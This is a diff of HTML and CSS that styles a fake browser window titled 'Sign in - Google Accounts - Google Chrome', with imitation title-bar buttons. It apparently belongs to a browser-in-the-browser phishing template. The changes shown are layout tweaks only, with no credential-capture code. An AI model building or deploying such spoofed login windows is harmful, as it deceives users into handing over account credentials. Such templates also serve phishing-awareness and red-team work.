@@ -108,7 +108,8 @@
 		box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
 		height: 759px;
 		/* title bar height + content height */
-		width: 40%;
+		max-width: 500px;
+		margin-right: 20px;
 	}
 </style>
 
@@ -117,12 +118,12 @@
 		<!-- Title bar start -->
 		<div id="title-bar-width">
 			<div id="title-bar">
-				<div style="margin-top:5px;">
+				<div style="margin-top:5px;white-space: nowrap;overflow: hidden;">
 					<img src="https://www.google.com/favicon.ico" width="16px" height="16px" id="logo">
 					<span id="logo-description">Sign in - Google Accounts - Google Chrome</span>
 				</div>
 
-				<div>
+				<div style="width: fit-content;text-align: end;display: flex;">
 					<span id="minimize">&#8212;</span>
 					<span id="square">□</span>
 					<span id="exit">✕</span>
